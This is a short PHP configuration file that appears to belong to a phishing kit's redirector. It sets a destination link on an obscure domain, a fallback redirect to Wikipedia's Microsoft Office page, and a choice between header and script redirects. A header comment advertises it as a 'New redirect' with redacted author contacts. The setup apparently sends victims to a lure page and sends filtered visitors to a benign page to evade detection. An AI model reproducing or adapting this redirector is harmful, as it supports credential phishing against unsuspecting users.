<?php
/* 

New redirect ########@#####: ########@#####-

########@#####: facebook.com/########@#####*/

$pagelink="https://mnufjhb.com/testing";
$FailRedirect="https://www.wikipedia.org/wiki/Microsoft_Office";
$redirecttype="2";// 1:header - 2:script
?>